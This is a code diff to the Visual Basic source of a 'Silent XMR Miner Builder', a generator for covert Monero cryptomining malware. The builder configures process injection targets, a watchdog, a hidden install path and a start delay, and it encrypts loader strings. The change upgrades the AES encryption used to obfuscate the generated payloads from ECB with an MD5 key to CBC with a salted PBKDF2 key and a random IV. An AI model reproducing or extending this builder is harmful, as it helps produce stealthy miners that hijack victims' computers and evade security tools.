@@ -20,7 +20,7 @@ Public Class Form1
 
     Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
         Try
-            MephForm1.Text = "Silent XMR Miner Builder 1.0.2"
+            MephForm1.Text = "Silent XMR Miner Builder 1.0.3"
         Catch ex As Exception
         End Try
 
@@ -50,7 +50,9 @@ Public Class Form1
     Public Resources_watchdog = Randomi(rand.Next(5, 40))
     Public Resources_winring = Randomi(rand.Next(5, 40))
     Public Resources_Parent = Randomi(rand.Next(5, 40))
-    Public AESKEY As String = Randomi(rand.Next(5, 40))
+    Public AESKEY As String = Randomi(256)
+    Public SALT As String = Randomi(32)
+    Public IV As String = Randomi(16)
 
     Private Sub btnBuild_Click(sender As Object, e As EventArgs) Handles btnBuild.Click
         Try
@@ -95,6 +97,8 @@ Public Class Form1
             minerbuilder.Replace("#ParentRes", Resources_Parent)
             minerbuilder.Replace("#STARTDELAY", txtStartDelay.Text)
             minerbuilder.Replace("#KEY", AESKEY)
+            minerbuilder.Replace("#SALT", SALT)
+            minerbuilder.Replace("#IV", IV)
             minerbuilder.Replace("#LIBSPATH", EncryptString("WinCFG\Libs\"))
             minerbuilder.Replace("#DLLSTR", EncryptString("Project1.Program"))
             minerbuilder.Replace("#DLLOAD", EncryptString("Load"))
@@ -143,6 +147,9 @@ Public Class Form1
 
                     watchdogbuilder.Replace("#InjectionTarget", EncryptString(InjectionTarget(0)))
                     watchdogbuilder.Replace("#KEY", AESKEY)
+                    watchdogbuilder.Replace("#SALT", SALT)
+                    watchdogbuilder.Replace("#IV", IV)
+                    watchdogbuilder.Replace("#STARTDELAY", txtStartDelay.Text)
                     watchdogbuilder.Replace("PayloadPath", "System.IO.Path.Combine(Microsoft.VisualBasic.Interaction.Environ(" & Chr(34) & txtInstallPathMain.Text & Chr(34) & ")," & Chr(34) & txtInstallFileName.Text & Chr(34) & ")")
 
                     WatchdogSource = watchdogbuilder.ToString()
@@ -212,20 +219,20 @@ Public Class Form1
     End Sub
 
     Public Function AES_Encryptor(ByVal input As Byte()) As Byte()
-        Dim AES As New RijndaelManaged
-        Dim Hash_ As New MD5CryptoServiceProvider
-        Try
-            Dim hash(31) As Byte
-            Dim temp As Byte() = Hash_.ComputeHash(Encoding.ASCII.GetBytes(AESKEY))
-            Array.Copy(temp, 0, hash, 0, 16)
-            Array.Copy(temp, 0, hash, 15, 16)
-            AES.Key = hash
-            AES.Mode = CipherMode.ECB
-            Dim DESEncrypter As ICryptoTransform = AES.CreateEncryptor
-            Dim Buffer As Byte() = input
-            Return DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
-        Catch ex As Exception
-        End Try
+        Dim initVectorBytes As Byte() = Encoding.ASCII.GetBytes(IV)
+        Dim saltValueBytes As Byte() = Encoding.ASCII.GetBytes(SALT)
+        Dim k1 As New Rfc2898DeriveBytes(AESKEY, saltValueBytes, 100)
+        Dim symmetricKey As New RijndaelManaged
+        symmetricKey.KeySize = 256
+        symmetricKey.Mode = CipherMode.CBC
+        Dim encryptor As ICryptoTransform = symmetricKey.CreateEncryptor(k1.GetBytes(16), initVectorBytes)
+        Using mStream As New MemoryStream()
+            Using cStream As New CryptoStream(mStream, encryptor, CryptoStreamMode.Write)
+                cStream.Write(input, 0, input.Length)
+                cStream.Close()
+            End Using
+            Return mStream.ToArray()
+        End Using
     End Function
 
     Public Function EncryptString(ByVal input As String)
